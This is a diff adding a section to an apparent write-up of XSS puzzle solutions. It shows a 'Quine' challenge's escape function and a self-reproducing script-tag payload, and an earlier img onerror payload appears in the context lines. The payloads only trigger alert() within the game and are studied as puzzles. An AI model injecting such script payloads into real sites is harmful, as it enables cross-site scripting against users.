@@ -30,3 +30,26 @@ output:
 ```
 <img src=a onerror=alert(1)>hello</span>
 ```
+
+## Quine (63)
+```
+/ submitted by Somebody
+function escape(s) {
+    // We've got a quine level in all of the other
+    // games, so why not have one here?
+    var win = alert;
+    window.alert = function(t) {
+        if (t === s)
+            win(1);
+        else
+            console.log("Alert: " + t + "\n(That's not a quine)");
+    }
+    return s;
+}
+```
+
+input:
+```
+<script>f=_=>alert(`<script>f=${f};f()<\/script>`);f()</script>
+```
+output is equal to the input value.
